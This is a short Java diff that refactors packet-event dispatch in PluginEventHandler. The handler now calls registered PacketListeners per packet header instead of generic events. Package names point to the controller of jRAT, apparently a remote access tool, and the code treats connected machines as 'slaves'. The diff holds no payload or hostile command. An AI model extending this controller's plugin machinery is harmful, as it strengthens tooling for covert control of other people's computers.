@@ -1,21 +1,22 @@
 package se.jrat.controller.addons;
 
+import jrat.api.Client;
 import jrat.api.Packet;
 import jrat.api.events.Event;
 import jrat.api.events.EventType;
 import jrat.api.events.OnConnectEvent;
 import jrat.api.events.OnDisconnectEvent;
-import jrat.api.events.OnPacketEvent;
 import jrat.api.events.OnSendPacketEvent;
+import jrat.api.net.PacketListener;
 import se.jrat.controller.AbstractSlave;
 
 public class PluginEventHandler {
 
-	public static void onPacket(AbstractSlave slave, byte header) {
-		OnPacketEvent e = new OnPacketEvent(ClientFormat.format(slave), new Packet(header));
+	public static void onPacket(AbstractSlave slave, byte header) {				
+		Client client = ClientFormat.format(slave);
 		
-		for (Event event : Event.getHandler().getEvents(EventType.EVENT_CLIENT_PACKET_RECEIVED)) {
-			event.perform(e);
+		for (PacketListener l : Packet.getEvents(header)) {
+			l.perform(client);
 		}
 	}
 
